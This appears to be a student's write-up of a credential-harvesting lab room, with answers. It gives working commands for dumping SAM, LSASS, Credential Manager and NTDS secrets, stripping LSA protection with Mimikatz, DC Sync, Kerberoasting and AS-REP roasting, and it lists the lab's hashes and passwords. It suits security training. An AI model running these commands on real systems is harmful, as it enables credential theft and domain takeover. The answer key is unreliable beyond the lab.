## 🛠️ Task 1: Introduction

### What is Credential Harvesting?
- Gaining access to user and system credentials (usernames/passwords, NTLM hashes, Kerberos tickets).
- Internal harvesting focuses on already compromised systems within the network.

### Credential Access Locations
| Location | Examples |
|----------|----------|
| Clear-text files | Command history, config files, registry, source code |
| Database files | Application databases (e.g., McAfee) |
| Memory | LSASS process, cached credentials |
| Password Managers | Windows Credential Manager, KeePass, LastPass |
| Active Directory | NTDS.dit, SYSVOL, user descriptions |
| Network Sniffing | LLMNR/NBNS poisoning, SMB relay |

## 🔐 Task 2: Local Windows Credentials

### Keylogger
- Software/hardware to monitor keyboard input.
- Can be used with Metasploit for credential theft.

### Security Account Manager (SAM)
- Database storing local account credentials (encrypted).
- Cannot be accessed while Windows is running.

### Dumping SAM Database

#### Method 1: Metasploit Hashdump
```bash
meterpreter > getuid
meterpreter > hashdump
```

#### Method 2: Volume Shadow Copy (VSS)
```cmd
# Create shadow copy
wmic shadowcopy call create Volume='C:\'

# List shadows
vssadmin list shadows

# Copy SAM and SYSTEM files
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\Users\Administrator\Desktop\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\Users\Administrator\Desktop\system
```

#### Method 3: Registry Hives
```cmd
reg save HKLM\sam C:\Users\Administrator\Desktop\sam-reg
reg save HKLM\system C:\Users\Administrator\Desktop\system-reg
```

#### Decrypting with Impacket
```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam-reg -system system-reg LOCAL
```

**Task 2 Answer:**
- NTLM hash for Administrator → `98d3a787a80d08385cea7fb4aa2a4261`

## 🧠 Task 3: LSASS Memory Dumping

### What is LSASS?
- Local Security Authority Server Service – handles security policy, authentication, and credential storage.
- **Juicy target** for credential dumping.

### Methods to Dump LSASS

#### Method 1: Task Manager (GUI)
- Task Manager → Details → `lsass.exe` → Create dump file.

#### Method 2: ProcDump (Sysinternals)
```cmd
c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump
```

### Extracting Credentials with Mimikatz
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

### Protected LSASS (LSA Protection)
- Registry key: `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL`
- Value `1` = enabled, `0` = disabled.
- Bypass with Mimikatz driver:
```cmd
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # sekurlsa::logonpasswords
```

**Task 3 Answer:**
- Is LSA protection enabled? → `Y`

## 🔑 Task 4: Windows Credential Manager

### What is Credential Manager?
- Stores login credentials for websites, applications, and networks.
- Four categories: Web, Windows, Generic, Certificate-based.

### Enumerating Credentials

#### Using `vaultcmd`
```cmd
vaultcmd /list
vaultcmd /listproperties:"Web Credentials"
vaultcmd /listcreds:"Web Credentials"
```

#### Using PowerShell (Get-WebCredentials.ps1)
```powershell
Import-Module C:\Tools\Get-WebCredentials.ps1
Get-WebCredentials
```

### RunAs with Stored Credentials
```cmd
# List stored credentials
cmdkey /list

# Run as stored user with /savecred
runas /savecred /user:THM.red\thm-local cmd.exe
```

### Dumping Credential Manager with Mimikatz
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::credman
```

## 🏛️ Task 5: Domain Controller – NTDS Extraction

### What is NTDS?
- New Technologies Directory Services – database containing all AD objects and credentials.
- Located at `C:\Windows\NTDS\ntds.dit` (encrypted, locked while running).

### Local Dumping with `ntdsutil`
```powershell
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

### Extracting Hashes with Impacket
```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
```

### DC Sync (Remote Dumping)
- Requires credentials with replication permissions.
```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc THM.red/<AD_Admin_User>@10.10.53.63
```

### Cracking NTLM Hashes
```bash
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Task 5 Answers:**
- Target system bootkey → `0x36c8d26ec0df8b23ce63bcefa6e2d821`
- Clear-text password for `bk-admin` → `Passw0rd123`

## 🔓 Task 6: LAPS (Local Administrator Password Solution)

### Group Policy Preferences (GPP)
- Old method using SYSVOL XML files with AES-256 encryption (key later leaked).
- Tool: `Get-GPPPassword`

### LAPS Overview
- Uses AD attributes: `ms-mcs-AdmPwd` (password) and `ms-mcs-AdmPwdExpirationTime`.
- More secure than GPP.

### Enumerating LAPS
```powershell
# Check LAPS installation
dir "C:\Program Files\LAPS\CSE"

# List LAPS cmdlets
Get-Command *AdmPwd*

# Find who can read LAPS passwords
Find-AdmPwdExtendedRights -Identity THMorg

# Get LAPS password
Get-AdmPwdPassword -ComputerName creds-harvestin
```

**Task 6 Answers:**
- Group with ExtendedRightHolder → `LAPsReader`
- LAPS password for Creds-Harvestin → `THMLAPSPassw0rd`
- User able to read LAPS passwords → `bk-admin`

## ⚔️ Task 7: AD Attacks – Kerberoasting & AS-REP Roasting

### Kerberoasting
- Attack on Service Principal Name (SPN) accounts.
- Request TGS tickets and crack offline.

```bash
# Enumerate SPN accounts
python3 GetUserSPNs.py -dc-ip 10.10.53.63 THM.red/thm

# Request TGS ticket
python3 GetUserSPNs.py -dc-ip 10.10.53.63 THM.red/thm -request-user svc-thm

# Crack with Hashcat
hashcat -m 13100 -a 0 spn.hash /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting
- Targets users with "Do not require Kerberos pre-authentication" enabled.
- Request TGT without password and crack offline.

```bash
python3 GetNPUsers.py -dc-ip 10.10.53.63 thm.red/ -usersfile users.lst
hashcat -m 18200 -a 0 asrep.hash /usr/share/wordlists/rockyou.txt
```

### LLMNR/NBNS Poisoning & SMB Relay
- Network attacks to capture NTLM hashes.
- Requires SMB signing disabled for SMB relay.

**Task 7 Answers:**
- SPN for Domain Controller → `svc-thm`
- Password from Kerberoasting → `Passw0rd1`

## 🔑 Key Takeaways
- **SAM database** can be dumped via Volume Shadow Copy or Registry hives.
- **LSASS memory** contains cleartext passwords, NTLM hashes, and Kerberos tickets.
- **Mimikatz** is essential for extracting credentials from memory.
- **Credential Manager** stores passwords that can be extracted with `vaultcmd` and PowerShell scripts.
- **NTDS.dit** contains all AD domain credentials – extract with `ntdsutil` or DC Sync.
- **LAPS** stores local admin passwords in AD – enumerate with PowerShell cmdlets.
- **Kerberoasting** targets SPN accounts – crack TGS tickets offline.
- **AS-REP Roasting** targets users without pre-authentication – crack TGTs offline.
